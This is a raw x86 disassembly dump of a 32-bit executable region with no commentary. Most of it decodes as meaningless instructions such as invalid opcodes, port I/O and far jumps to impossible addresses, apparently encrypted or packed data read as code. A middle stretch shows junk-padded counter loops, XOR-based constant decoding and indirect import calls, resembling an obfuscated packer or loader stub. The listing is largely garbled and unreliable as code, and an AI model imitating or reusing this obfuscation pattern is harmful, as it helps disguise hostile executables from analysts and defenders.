  40b2d7:	out    0x87,al
  40b2d9:	rcl    al,cl
  40b2db:	int    0x1
  40b2dd:	sub    BYTE PTR [ebx-0x51c573fe],al
  40b2e3:	mov    bh,0xb6
  40b2e5:	cld    
  40b2e6:	sbb    al,BYTE PTR [ebx]
  40b2e8:	test   al,al
  40b2ea:	jmp    0x40b31c
  40b2ec:	mov    bl,0xd8
  40b2ee:	mov    WORD PTR [ecx+0x682347bc],fs
  40b2f4:	pop    ds
  40b2f5:	inc    esp
  40b2f6:	js     0x40b282
  40b2f8:	and    eax,0x670352e7
  40b2fd:	in     al,dx
  40b2fe:	jg     0x40b2c9
  40b300:	add    WORD PTR [ecx+0x73381423],bp
  40b307:	out    0xff,eax
  40b309:	aad    0xbf
  40b30b:	mov    dh,0x7
  40b30d:	gs nop
  40b30f:	inc    eax
  40b310:	data16 jge 0x40b38d
  40b313:	inc    edx
  40b314:	mov    ebp,esi
  40b316:	xchg   esi,eax
  40b317:	jnp    0x40b2c3
  40b319:	jg     0x40b335
  40b31b:	dec    eax
  40b31c:	mov    edi,DWORD PTR [ebp+eax*2+0x2c]
  40b320:	mov    dl,0x14
  40b322:	clc    
  40b323:	jne    0x40b319
  40b325:	loopne 0x40b2b6
  40b327:	add    BYTE PTR [ecx+0x29],al
  40b32a:	and    ecx,ecx
  40b32c:	scas   eax,DWORD PTR es:[edi]
  40b32d:	sbb    DWORD PTR fs:[edi-0x22],ebp
  40b331:	jle    0x40b326
  40b333:	imul   ecx,DWORD PTR [esi],0x6c
  40b336:	jno    0x40b316
  40b338:	sti    
  40b339:	aaa    
  40b33a:	out    dx,al
  40b33b:	sub    edx,DWORD PTR [eax]
  40b33d:	pop    ebx
  40b33e:	(bad)  
  40b33f:	frstor [ebp+0x3a601e59]
  40b345:	daa    
  40b346:	dec    ebp
  40b347:	mov    dh,0x54
  40b349:	sbb    eax,0xa77950c5
  40b34e:	jb     0x40b363
  40b350:	mov    ds:0xd24a3f45,eax
  40b355:	or     DWORD PTR [edx-0x2824ed58],ebp
  40b35b:	sbb    al,0x5f
  40b35d:	adc    BYTE PTR [ecx],bh
  40b35f:	mov    ch,0xe7
  40b361:	sbb    al,0x3a
  40b363:	int    0xff
  40b365:	xchg   BYTE PTR [edi+0x54],cl
  40b368:	shr    ebp,cl
  40b36a:	cwde   
  40b36b:	mov    WORD PTR [ebp-0x6ddb06ef],?
  40b371:	call   0x4e1d:0x8e5c190b
  40b378:	sbb    ah,BYTE PTR [eax-0x80]
  40b37b:	and    ecx,DWORD PTR [ecx+edi*4-0x7e]
  40b37f:	xchg   ebp,eax
  40b380:	je     0x40b3a2
  40b382:	inc    eax
  40b383:	or     eax,0x8d0ddd96
  40b388:	add    bl,BYTE PTR [ecx]
  40b38a:	ins    BYTE PTR es:[edi],dx
  40b38b:	push   0xc1ec47e1
  40b390:	repnz fwait
  40b392:	dec    eax
  40b393:	jno    0x40b3a5
  40b395:	add    DWORD PTR [edi+edx*8-0x585caccc],ecx
  40b39c:	pop    ebp
  40b39d:	lods   eax,DWORD PTR ds:[esi]
  40b39e:	mov    ch,0xe2
  40b3a0:	mov    esp,0x4da557d1
  40b3a5:	mov    DWORD PTR [ecx+0x13],ecx
  40b3a8:	retf   
  40b3a9:	enter  0x1be9,0x26
  40b3ad:	jle    0x40b417
  40b3af:	test   eax,0x9f9d8248
  40b3b4:	aam    0xc7
  40b3b6:	jo     0x40b3ec
  40b3b8:	shr    DWORD PTR [ebp+ecx*2+0x2d],cl
  40b3bc:	sub    edx,DWORD PTR [ecx+0x45064ef1]
  40b3c2:	jbe    0x40b3c0
  40b3c4:	push   esi
  40b3c5:	cld    
  40b3c6:	icebp  
  40b3c7:	sti    
  40b3c8:	xchg   ebx,eax
  40b3c9:	jge    0x40b435
  40b3cb:	outs   dx,DWORD PTR ds:[esi]
  40b3cc:	fs xor al,0x38
  40b3d0:	scas   al,BYTE PTR es:[edi]
  40b3d1:	dec    ecx
  40b3d2:	icebp  
  40b3d3:	sub    BYTE PTR [ecx],al
  40b3d5:	stc    
  40b3d6:	outs   dx,BYTE PTR ds:[esi]
  40b3d7:	push   eax
  40b3d8:	cmp    BYTE PTR [ebx-0x129e04ea],al
  40b3de:	jnp    0x40b367
  40b3e0:	pop    esi
  40b3e1:	adc    ah,cl
  40b3e3:	jae    0x40b384
  40b3e5:	lods   al,BYTE PTR ds:[esi]
  40b3e6:	pusha  
  40b3e7:	jns    0x40b445
  40b3e9:	push   esi
  40b3ea:	push   ss
  40b3eb:	push   es
  40b3ec:	mov    al,0x28
  40b3ee:	pop    esi
  40b3ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3f0:	sub    eax,0xc3cb47a3
  40b3f5:	pop    edx
  40b3f6:	jg     0x40b37a
  40b3f8:	push   ebp
  40b3f9:	in     eax,0x94
  40b3fb:	jnp    0x40b3cc
  40b3fd:	data16 icebp 
  40b3ff:	push   ecx
  40b400:	cmp    ah,BYTE PTR [esi-0x22e6ea57]
  40b406:	or     edx,DWORD PTR [eax+eiz*8]
  40b409:	xchg   edx,esi
  40b40b:	sub    DWORD PTR [edi],eax
  40b40d:	xchg   BYTE PTR [esp+eiz*8],cl
  40b410:	mov    ecx,0x56bb0377
  40b415:	loope  0x40b444
  40b417:	fwait
  40b418:	dec    edx
  40b419:	xchg   ecx,eax
  40b41a:	out    dx,eax
  40b41b:	mov    ch,BYTE PTR [eax+edi*8]
  40b41e:	fwait
  40b41f:	popf   
  40b420:	xor    edx,DWORD PTR cs:[ebx+ebx*1]
  40b424:	stc    
  40b425:	jge    0x40b3d0
  40b427:	inc    edi
  40b428:	fnstsw WORD PTR [esi]
  40b42a:	adc    edi,ecx
  40b42c:	je     0x40b410
  40b42e:	inc    ebx
  40b42f:	in     al,0x10
  40b431:	sbb    al,0xb2
  40b433:	adc    eax,0xa24d4c81
  40b438:	fld    QWORD PTR [esi]
  40b43a:	push   ds
  40b43b:	arpl   WORD PTR [ebx],cx
  40b43d:	inc    ebp
  40b43e:	arpl   WORD PTR [edx],cx
  40b440:	daa    
  40b441:	mov    cs,WORD PTR [ecx+0x5852b3f4]
  40b447:	mov    esp,0x403a182e
  40b44c:	xchg   ecx,eax
  40b44d:	int3   
  40b44e:	xchg   BYTE PTR [edx+0x58],al
  40b451:	xchg   ebp,eax
  40b452:	dec    ecx
  40b453:	adc    dl,BYTE PTR [ebp+0x74]
  40b456:	xor    edi,DWORD PTR [eax+0x4c56a8ed]
  40b45c:	add    eax,0xd61dc40
  40b461:	push   esi
  40b462:	lea    esp,[esi+0x71]
  40b465:	test   BYTE PTR [edx-0x1b],0x82
  40b469:	xchg   ecx,eax
  40b46a:	(bad)  
  40b46b:	shl    DWORD PTR [ebp+eiz*8+0x14],0x72
  40b470:	sbb    edx,DWORD PTR [esi+esi*2]
  40b473:	(bad)  
  40b474:	popa   
  40b475:	loope  0x40b4c8
  40b477:	popf   
  40b478:	and    dl,BYTE PTR [esi-0x80]
  40b47b:	or     DWORD PTR [eax+0x5d],0xffffff90
  40b47f:	jae    0x40b4d9
  40b481:	les    ecx,FWORD PTR [ecx+0x57]
  40b484:	cmp    eax,0xc79db18e
  40b489:	mov    edx,fs
  40b48b:	pop    es
  40b48c:	rsqrtps xmm6,xmm4
  40b48f:	enter  0xb473,0x37
  40b493:	add    DWORD PTR [ebp+0x34],esi
  40b496:	scas   al,BYTE PTR es:[edi]
  40b497:	dec    esi
  40b498:	mov    ds:0xcb0f63cf,eax
  40b49d:	jnp    0x40b48f
  40b49f:	pop    ds
  40b4a0:	and    al,0x32
  40b4a2:	mov    al,ds:0xfe26cbe1
  40b4a7:	daa    
  40b4a8:	ins    DWORD PTR es:[edi],dx
  40b4a9:	pop    edi
  40b4aa:	xor    esi,esp
  40b4ac:	inc    ecx
  40b4ad:	xchg   DWORD PTR [esp+edi*8],ebx
  40b4b0:	les    edx,FWORD PTR [edi-0x7d]
  40b4b3:	lock mov ecx,?
  40b4b6:	mov    edi,0xb66a42a9
  40b4bb:	fcmovu st,st(2)
  40b4bd:	fwait
  40b4be:	clc    
  40b4bf:	sub    ebx,DWORD PTR [edx]
  40b4c1:	fiadd  DWORD PTR [edx+0x10382141]
  40b4c7:	jp     0x40b4ec
  40b4c9:	jo     0x40b48d
  40b4cb:	mov    al,0x98
  40b4cd:	xor    eax,DWORD PTR [edx+0x1f]
  40b4d0:	(bad)  
  40b4d2:	sbb    BYTE PTR [ebp-0x69],ah
  40b4d5:	in     al,0xdd
  40b4d7:	gs icebp 
  40b4d9:	(bad)  
  40b4da:	(bad)  
  40b4db:	cmp    ch,al
  40b4dd:	and    al,0xde
  40b4df:	stos   BYTE PTR es:[edi],al
  40b4e0:	pop    ss
  40b4e1:	out    0xd2,eax
  40b4e3:	in     eax,dx
  40b4e4:	xor    eax,0xdc00f1b8
  40b4e9:	imul   esi,ecx,0xfffffffd
  40b4ec:	fld    TBYTE PTR [esi]
  40b4ee:	xchg   ecx,eax
  40b4ef:	rol    cl,0xad
  40b4f2:	dec    edi
  40b4f3:	gs dec ecx
  40b4f5:	mov    ecx,0xf014fc43
  40b4fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4fb:	icebp  
  40b4fc:	stc    
  40b4fd:	mov    al,dl
  40b4ff:	dec    ebx
  40b500:	(bad)  
  40b501:	pop    DWORD PTR [edx]
  40b503:	jg     0x40b487
  40b505:	in     eax,0xdd
  40b507:	ror    BYTE PTR [ecx-0x7],cl
  40b50a:	les    ecx,FWORD PTR [edx+0x6e]
  40b50d:	and    eax,0x842663d3
  40b512:	dec    esi
  40b513:	popf   
  40b514:	xor    BYTE PTR [edi],bl
  40b516:	xchg   ebp,eax
  40b517:	je     0x40b500
  40b519:	rcr    BYTE PTR [esi],1
  40b51b:	stc    
  40b51c:	cmp    eax,0xa81291c5
  40b521:	jl     0x40b51b
  40b523:	and    ebx,esi
  40b525:	(bad)  
  40b526:	push   ecx
  40b527:	enter  0x4b30,0xd7
  40b52b:	rol    ecx,1
  40b52d:	mov    WORD PTR [esi+eax*2+0x160aab01],ss
  40b534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b535:	xchg   ebx,eax
  40b536:	sbb    ecx,DWORD PTR [edi]
  40b538:	rcl    DWORD PTR [eax-0x13f275f8],0xa
  40b53f:	sbb    al,0xf1
  40b541:	push   es
  40b542:	jnp    0x40b504
  40b544:	cld    
  40b545:	mov    esp,0x779fe22f
  40b54a:	in     eax,0xaf
  40b54c:	and    al,0xc2
  40b54e:	or     BYTE PTR [eax-0x3544dd4b],al
  40b554:	jl     0x40b5c6
  40b556:	jmp    0x2d9e21a2
  40b55b:	or     DWORD PTR ds:0xcc2f7f33,esi
  40b561:	jp     0x40b577
  40b563:	cmp    cl,BYTE PTR [eax]
  40b565:	arpl   WORD PTR [eax+0x21],si
  40b568:	adc    esp,ebp
  40b56a:	lods   al,BYTE PTR ds:[esi]
  40b56b:	in     al,dx
  40b56c:	cmp    al,0xa8
  40b56e:	xchg   ebp,ebp
  40b570:	or     cl,BYTE PTR [ebx]
  40b572:	lods   eax,DWORD PTR ds:[esi]
  40b573:	push   ecx
  40b574:	xor    eax,0x5a254db3
  40b579:	pop    ebx
  40b57a:	out    0x56,ax
  40b57d:	adc    esi,0x29b8
  40b583:	push   edi
  40b584:	or     edi,DWORD PTR ds:0x42b010
  40b58a:	mov    esi,0x7510893
  40b58f:	or     ecx,ecx
  40b591:	xor    eax,esi
  40b593:	mov    edi,0x3272db
  40b598:	add    eax,edi
  40b59a:	sub    DWORD PTR ds:0x42a018,0x772b
  40b5a4:	mov    DWORD PTR [ebp-0x38],eax
  40b5a7:	mov    eax,ds:0x4217d2
  40b5ac:	mov    ecx,DWORD PTR ds:0x428008
  40b5b2:	and    DWORD PTR ds:0x42b004,ecx
  40b5b8:	mov    eax,DWORD PTR [eax]
  40b5ba:	mov    DWORD PTR ds:0x42a01c,0x19
  40b5c4:	cmp    DWORD PTR ds:0x42a01c,0x0
  40b5cb:	je     0x40b61b
  40b5d1:	cmp    DWORD PTR ds:0x42a01c,0x4
  40b5d8:	jne    0x40b5ef
  40b5de:	push   0x506a
  40b5e3:	push   DWORD PTR [ebp-0x24]
  40b5e6:	push   DWORD PTR [ebp-0x14]
  40b5e9:	call   DWORD PTR ds:0x424028
  40b5ef:	cmp    DWORD PTR ds:0x42a01c,0x5
  40b5f6:	jne    0x40b609
  40b5fc:	mov    ecx,DWORD PTR ds:0x42a01c
  40b602:	dec    ecx
  40b603:	mov    DWORD PTR ds:0x42a01c,ecx
  40b609:	mov    ecx,DWORD PTR ds:0x42a01c
  40b60f:	dec    ecx
  40b610:	mov    DWORD PTR ds:0x42a01c,ecx
  40b616:	jmp    0x40b5c4
  40b61b:	mov    DWORD PTR [ebp-0x24],eax
  40b61e:	add    DWORD PTR ds:0x428014,ecx
  40b624:	mov    eax,ds:0x4219da
  40b629:	mov    ecx,DWORD PTR ds:0x42174a
  40b62f:	mov    ecx,DWORD PTR [ecx]
  40b631:	adc    DWORD PTR ds:0x42a008,ecx
  40b637:	mov    eax,DWORD PTR [eax]
  40b639:	and    DWORD PTR ds:0x42a01c,0x0
  40b643:	jmp    0x40b655
  40b648:	mov    ecx,DWORD PTR ds:0x42a01c
  40b64e:	inc    ecx
  40b64f:	mov    DWORD PTR ds:0x42a01c,ecx
  40b655:	cmp    DWORD PTR ds:0x42a01c,0x10
  40b65c:	jae    0x40b75b
  40b662:	cmp    DWORD PTR ds:0x42a01c,0x8
  40b669:	jne    0x40b67f
  40b66f:	push   0x42358e
  40b674:	push   0x42350e
  40b679:	call   DWORD PTR ds:0x424030
  40b67f:	cmp    DWORD PTR ds:0x42a01c,0x7
  40b686:	jne    0x40b69b
  40b68c:	xor    ecx,ecx
  40b68e:	xor    ecx,DWORD PTR ds:0x42a01c
  40b694:	inc    ecx
  40b695:	mov    DWORD PTR ds:0x42a01c,ecx
  40b69b:	jmp    0x40b648
  40b6a0:	and    DWORD PTR ds:0x42901c,0x0
  40b6aa:	jmp    0x40b6bc
  40b6af:	mov    ecx,DWORD PTR ds:0x42901c
  40b6b5:	inc    ecx
  40b6b6:	mov    DWORD PTR ds:0x42901c,ecx
  40b6bc:	cmp    DWORD PTR ds:0x42901c,0x11
  40b6c3:	jae    0x40b75b
  40b6c9:	cmp    DWORD PTR ds:0x42901c,0x7
  40b6d0:	jne    0x40b6f6
  40b6d6:	push   DWORD PTR [ebp-0x10]
  40b6d9:	push   DWORD PTR [ebp-0x18]
  40b6dc:	push   0x2cae
  40b6e1:	push   0x19d0
  40b6e6:	push   0x7b35
  40b6eb:	push   0x42c01c
  40b6f0:	call   DWORD PTR ds:0x424038
  40b6f6:	cmp    DWORD PTR ds:0x42901c,0x6
  40b6fd:	jne    0x40b710
  40b703:	mov    ecx,DWORD PTR ds:0x42901c
  40b709:	inc    ecx
  40b70a:	mov    DWORD PTR ds:0x42901c,ecx
  40b710:	jmp    0x40b6af
  40b715:	mov    DWORD PTR ds:0x42c00c,0x11
  40b71f:	cmp    DWORD PTR ds:0x42c00c,0x0
  40b726:	je     0x40b75b
  40b72c:	cmp    DWORD PTR ds:0x42c00c,0x18
  40b733:	jne    0x40b749
  40b739:	push   0x42a008
  40b73e:	push   0x6229
  40b743:	call   DWORD PTR ds:0x42403c
  40b749:	mov    ecx,DWORD PTR ds:0x42c00c
  40b74f:	dec    ecx
  40b750:	mov    DWORD PTR ds:0x42c00c,ecx
  40b756:	jmp    0x40b71f
  40b75b:	mov    DWORD PTR [ebp-0x28],eax
  40b75e:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  40b765:	mov    eax,DWORD PTR [ebp-0x34]
  40b768:	xor    eax,esi
  40b76a:	add    eax,edi
  40b76c:	sbb    DWORD PTR ds:0x42a000,0x3656
  40b776:	mov    DWORD PTR [ebp-0x38],eax
  40b779:	mov    eax,ds:0x421952
  40b77e:	mov    DWORD PTR [ebp-0x38],eax
  40b781:	or     eax,0x6382
  40b786:	mov    eax,DWORD PTR [ebp-0x24]
  40b789:	and    DWORD PTR ds:0x42a008,0x0
  40b793:	mov    ecx,DWORD PTR ds:0x42a008
  40b799:	inc    ecx
  40b79a:	mov    DWORD PTR ds:0x42a008,ecx
  40b7a0:	cmp    DWORD PTR ds:0x42a008,0x9
  40b7a7:	jne    0x40b7bb
  40b7ad:	push   DWORD PTR [ebp-0x14]
  40b7b0:	push   0x4234e9
  40b7b5:	call   DWORD PTR ds:0x424040
  40b7bb:	cmp    DWORD PTR ds:0x42a008,0x8
  40b7c2:	jne    0x40b7d7
  40b7c8:	xor    ecx,ecx
  40b7ca:	add    ecx,DWORD PTR ds:0x42a008
  40b7d0:	inc    ecx
  40b7d1:	mov    DWORD PTR ds:0x42a008,ecx
  40b7d7:	cmp    DWORD PTR ds:0x42a008,0x17
  40b7de:	jb     0x40b793
  40b7e4:	mov    DWORD PTR [ebp-0x14],eax
  40b7e7:	mov    eax,DWORD PTR [ebp-0x14]
  40b7ea:	dec    DWORD PTR ds:0x42c000
  40b7f0:	push   0x4
  40b7f2:	and    ecx,DWORD PTR ds:0x42a018
  40b7f8:	pop    ecx
  40b7f9:	sbb    DWORD PTR ds:0x42b000,0x429004
  40b803:	sub    ecx,eax
  40b805:	xor    DWORD PTR ds:0x42a01c,0x102e
  40b80f:	add    ecx,DWORD PTR [ebp-0x28]
  40b812:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  40b819:	adc    eax,0x5aaa
  40b81e:	mov    DWORD PTR [ebp-0x20],ecx
  40b821:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  40b82b:	and    DWORD PTR ds:0x428010,0x0
  40b835:	jmp    0x40b848
  40b83a:	xor    eax,eax
  40b83c:	add    eax,DWORD PTR ds:0x428010
  40b842:	inc    eax
  40b843:	mov    ds:0x428010,eax
  40b848:	cmp    DWORD PTR ds:0x428010,0x10
  40b84f:	jae    0x40b88a
  40b855:	cmp    DWORD PTR ds:0x428010,0x9
  40b85c:	jne    0x40b86d
  40b862:	push   0x423500
  40b867:	call   DWORD PTR ds:0x424044
  40b86d:	cmp    DWORD PTR ds:0x428010,0x8
  40b874:	jne    0x40b885
  40b87a:	mov    eax,ds:0x428010
  40b87f:	inc    eax
  40b880:	mov    ds:0x428010,eax
  40b885:	jmp    0x40b83a
  40b88a:	mov    eax,DWORD PTR [ebp-0x14]
  40b88d:	sbb    DWORD PTR ds:0x42a018,0x429014
  40b897:	mov    DWORD PTR [ebp-0x90],eax
  40b89d:	dec    eax
  40b89e:	mov    eax,DWORD PTR [ebp-0x20]
  40b8a1:	mov    DWORD PTR [ebp-0x8c],eax
  40b8a7:	add    DWORD PTR ds:0x42c00c,0x20f
  40b8b1:	mov    eax,DWORD PTR [ebp-0x2c]
  40b8b4:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  40b8be:	xor    eax,esi
  40b8c0:	add    eax,edi
  40b8c2:	mov    DWORD PTR [ebp-0x88],eax
  40b8c8:	lea    eax,[ebp-0x50]
  40b8cb:	or     DWORD PTR ds:0x42b014,0x1a32
  40b8d5:	mov    DWORD PTR [ebp-0x84],eax
  40b8db:	mov    eax,DWORD PTR [ebp-0x94]
  40b8e1:	xor    DWORD PTR ds:0x42b010,0x42a00c
  40b8eb:	xor    eax,esi
  40b8ed:	xor    DWORD PTR ds:0x42900c,0x429018
  40b8f7:	add    eax,edi
  40b8f9:	and    DWORD PTR ds:0x428020,0x42c01c
  40b903:	mov    DWORD PTR [ebp-0x94],eax
  40b909:	and    DWORD PTR ds:0x42a000,0x429010
  40b913:	lea    eax,[ebp-0x94]
  40b919:	adc    DWORD PTR ds:0x42b018,0x42c018
  40b923:	push   eax
  40b924:	movzx  eax,WORD PTR ds:0x42b01c
  40b92b:	add    DWORD PTR ds:0x42a008,eax
  40b931:	mov    eax,DWORD PTR [ebp+0xc]
  40b934:	xor    eax,esi
  40b936:	add    DWORD PTR ds:0x428028,0x2102
  40b940:	add    eax,edi
  40b942:	sub    DWORD PTR ds:0x429010,0x36a
  40b94c:	push   eax
  40b94d:	mov    eax,ds:0x421972
  40b952:	adc    DWORD PTR ds:0x428024,0x6674
  40b95c:	push   0x4218c8
  40b961:	and    DWORD PTR ds:0x42a014,0x6ed
  40b96b:	push   DWORD PTR [eax]
  40b96d:	add    DWORD PTR ds:0x42a000,0x42900c
  40b977:	call   0x405c6f
  40b97c:	or     eax,DWORD PTR ds:0x42901c
  40b982:	mov    eax,DWORD PTR [ebp-0x14]
  40b985:	and    ecx,0x4079
  40b98b:	mov    ecx,DWORD PTR [ebp-0x20]
  40b98e:	sub    DWORD PTR ds:0x42b01c,0xab5
  40b998:	mov    DWORD PTR [ebp-0x44],ecx
  40b99b:	sbb    DWORD PTR ds:0x42b01c,edi
  40b9a1:	mov    ecx,DWORD PTR [ebp+0x8]
  40b9a4:	jmp    0x40dd19
  40b9a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9aa:	or     ah,bl
  40b9ac:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0x19316403
  40b9b7:	loopne 0x40b9a9
  40b9b9:	dec    edi
  40b9ba:	hlt    
  40b9bb:	bound  esp,QWORD PTR [edx+0xa]
  40b9be:	pop    edi
  40b9bf:	bound  esp,QWORD PTR [edx+0x31]
  40b9c2:	lods   eax,DWORD PTR ds:[esi]
  40b9c3:	jae    0x40b9ee
  40b9c5:	push   edx
  40b9c6:	dec    esp
  40b9c7:	inc    esi
  40b9c8:	(bad)  
  40b9c9:	mov    dh,0x4a
  40b9cb:	stos   DWORD PTR es:[edi],eax
  40b9cc:	aam    0xbf
  40b9ce:	sbb    edi,edx
  40b9d0:	or     eax,0x19c0dda
  40b9d5:	mov    ds:0x7011025f,al
  40b9da:	sub    BYTE PTR [edi-0x753cfc8a],ah
  40b9e0:	lods   al,BYTE PTR ds:[esi]
  40b9e1:	clc    
  40b9e2:	cmp    al,0x92
  40b9e4:	fisttp QWORD PTR [eax]
  40b9e6:	aaa    
  40b9e7:	int3   
  40b9e8:	popa   
  40b9e9:	sub    al,0xdd
  40b9eb:	inc    esp
  40b9ec:	push   ebx
  40b9ed:	ds pushf 
  40b9ef:	dec    edi
  40b9f0:	int    0xc8
  40b9f2:	cmp    edx,DWORD PTR [ebx+eax*1+0x71]
  40b9f6:	adc    eax,0xe6eba2f
  40b9fb:	mov    dl,0x95
  40b9fd:	mov    ecx,0xa7b12ad
  40ba02:	add    bh,bl
  40ba04:	jle    0x40b995
  40ba06:	jmp    0x40b9c6
  40ba08:	mov    ?,ebp
  40ba0a:	dec    BYTE PTR [eax]
  40ba0c:	outs   dx,DWORD PTR ds:[esi]
  40ba0d:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba0f:	sub    edi,DWORD PTR [edx-0x6e]
  40ba12:	stos   DWORD PTR es:[edi],eax
  40ba13:	pop    es
  40ba14:	lea    edx,[ecx+0x4d]
  40ba17:	push   ss
  40ba18:	iret   
  40ba19:	repnz das 
  40ba1b:	dec    edx
  40ba1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba1e:	jns    0x40ba54
  40ba20:	xor    eax,0xb63d6f2
  40ba25:	aaa    
  40ba26:	inc    ecx
  40ba27:	mov    bl,0x7a
  40ba29:	scas   eax,DWORD PTR es:[edi]
  40ba2a:	push   ebx
  40ba2b:	clc    
  40ba2c:	cwde   
  40ba2d:	mov    edx,0xed17a2a5
  40ba32:	jp     0x40b9e9
  40ba34:	outs   dx,DWORD PTR ds:[esi]
  40ba35:	(bad)  
  40ba36:	cs xchg ebx,eax
  40ba38:	or     esp,ecx
  40ba3a:	test   BYTE PTR [edi],bl
  40ba3c:	mov    ch,0x71
  40ba3e:	xor    DWORD PTR [ebp-0x744f82b9],ecx
  40ba44:	addr16 inc ecx
  40ba46:	dec    ebp
  40ba47:	repz inc edi
  40ba49:	ins    DWORD PTR es:[edi],dx
  40ba4a:	cs ins BYTE PTR es:[edi],dx
  40ba4c:	fs ins BYTE PTR es:[edi],dx
  40ba4e:	lock sub BYTE PTR [edx+0x13],bl
  40ba52:	aam    0x41
  40ba54:	inc    ecx
  40ba55:	mov    esi,0x15a35368
  40ba5a:	pushf  
  40ba5b:	or     ah,BYTE PTR [edi+edi*8-0x7e88b1f1]
  40ba62:	in     al,dx
  40ba63:	inc    ecx
  40ba64:	cmc    
  40ba65:	dec    ebp
  40ba66:	jmp    0x83ba:0xef0c722d
  40ba6d:	ins    DWORD PTR es:[edi],dx
  40ba6e:	lods   al,BYTE PTR ds:[esi]
  40ba6f:	jnp    0x40ba5a
  40ba71:	inc    ebp
  40ba72:	adc    edi,edx
  40ba74:	mul    DWORD PTR [ebx+edi*4]
  40ba77:	dec    edi
  40ba78:	or     dh,cl
  40ba7a:	xchg   esi,eax
  40ba7b:	mov    bh,0xab
  40ba7d:	sub    dl,BYTE PTR [edi+0x78570d46]
  40ba83:	jl     0x40baf1
  40ba85:	sahf   
  40ba86:	mov    ds:0x8031fb92,al
  40ba8b:	int3   
  40ba8c:	icebp  
  40ba8d:	jae    0x40bb0a
  40ba8f:	xchg   esp,eax
  40ba90:	sbb    BYTE PTR [ebp+0x15c392c9],dl
  40ba96:	test   al,0x91
  40ba98:	bound  eax,QWORD PTR [esi*2-0x6dea1db5]
  40ba9f:	jbe    0x40ba97
  40baa1:	in     al,dx
  40baa2:	xlat   BYTE PTR ds:[ebx]
  40baa3:	sbb    ebp,DWORD PTR [edi-0xd90afa4]
  40baa9:	jb     0x40bae7
  40baab:	(bad)  
  40baac:	xor    bh,cl
  40baae:	jb     0x40ba4f
  40bab0:	sbb    eax,0x4c7b48ed
  40bab5:	jecxz  0x40bb30
  40bab7:	imul   ebp,DWORD PTR [eax+0x4d],0x4fd0848a
  40babe:	pusha  
  40babf:	retf   
  40bac0:	into   
  40bac1:	sahf   
  40bac2:	int    0x48
  40bac4:	test   al,0x44
  40bac6:	out    0x4f,al
  40bac8:	aaa    
  40bac9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baca:	loopne 0x40bb38
  40bacc:	adc    edi,DWORD PTR [eax-0x31]
  40bacf:	inc    esi
  40bad0:	data16 shl BYTE PTR [esi-0x1ff074f2],cl
  40bad7:	xor    esi,DWORD PTR [ebx]
  40bad9:	or     esi,DWORD PTR [edx-0x3ca88259]
  40badf:	retf   
  40bae0:	xchg   BYTE PTR [edi-0x2e6ba6ad],dl
  40bae6:	clc    
  40bae7:	mov    edi,es
  40bae9:	add    BYTE PTR ss:[ecx-0x7f],dh
  40baed:	pushf  
  40baee:	lahf   
  40baef:	retf   
  40baf0:	rcl    bh,1
  40baf2:	aam    0xca
  40baf4:	sub    BYTE PTR [esi-0x41],cl
  40baf7:	sbb    BYTE PTR [edi+0x40620dda],bh
  40bafd:	neg    BYTE PTR [esi]
  40baff:	or     edi,0x722cad89
  40bb05:	or     al,0xfe
  40bb07:	mov    esp,DWORD PTR [edi-0x207ef247]
  40bb0d:	mov    ecx,0x105f75dc
  40bb12:	pop    edi
  40bb13:	jl     0x40bb49
  40bb15:	test   ah,al
  40bb17:	pop    ecx
  40bb18:	and    eax,0xd8a48a48
  40bb1d:	mov    ds:0x81a0405a,al
  40bb22:	push   0x43
  40bb24:	les    esi,FWORD PTR [esi]
  40bb26:	sbb    al,0xe5
  40bb28:	pushf  
  40bb29:	clc    
  40bb2a:	jmp    0x6afd77d1
  40bb2f:	mov    dl,0x13
  40bb31:	out    dx,al
  40bb32:	mov    WORD PTR [edx-0x4b5b1a93],fs
  40bb38:	loopne 0x40baba
  40bb3a:	popf   
  40bb3b:	dec    edx
  40bb3c:	add    DWORD PTR [eax+0x5abaeae1],eax
  40bb42:	xchg   ebp,eax
  40bb43:	test   al,0x8e
  40bb45:	pop    ebp
  40bb46:	inc    esp
  40bb47:	arpl   si,ax
  40bb49:	jle    0x40bb95
  40bb4b:	fst    DWORD PTR [edi+edi*1]
  40bb4e:	rcl    DWORD PTR [esi],0xa6
  40bb51:	out    dx,eax
  40bb52:	push   ebp
  40bb53:	leave  
  40bb54:	fdiv   QWORD PTR [esi+0x55]
  40bb57:	cmp    bl,BYTE PTR [eax]
  40bb59:	mov    es,WORD PTR [eax+0x38]
  40bb5c:	clc    
  40bb5d:	pop    ebx
  40bb5e:	adc    BYTE PTR [edi],dh
  40bb60:	push   es
  40bb61:	shr    DWORD PTR [ebp-0x10],0xf3
  40bb65:	fnstenv [edx]
  40bb67:	jne    0x40bb46
  40bb69:	inc    ecx
  40bb6a:	and    eax,0xfd3c40a0
  40bb6f:	sub    ah,BYTE PTR [edx-0x4a]
  40bb72:	ins    BYTE PTR es:[edi],dx
  40bb73:	lea    ecx,[esi]
  40bb75:	stc    
  40bb76:	shl    BYTE PTR [ecx+ecx*4-0x5b],0x96
  40bb7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb7c:	jp     0x40bb1b
  40bb7e:	mov    ecx,0x1c16a880
  40bb83:	xchg   ebp,edi
  40bb85:	xchg   cl,al
  40bb87:	push   ss
  40bb88:	sar    ecx,cl
  40bb8a:	outs   dx,DWORD PTR ds:[esi]
  40bb8b:	mov    bh,0xe2
  40bb8d:	cmp    eax,0x737bb118
  40bb92:	sbb    esi,DWORD PTR [eax]
  40bb94:	scas   al,BYTE PTR es:[edi]
  40bb95:	cwde   
  40bb96:	jle    0x40bb2b
  40bb98:	cmp    DWORD PTR [ebp+0x5d],0x91a513e6
  40bb9f:	mov    ch,0x55
  40bba1:	call   0xbbc860a4
  40bba6:	aad    0x99
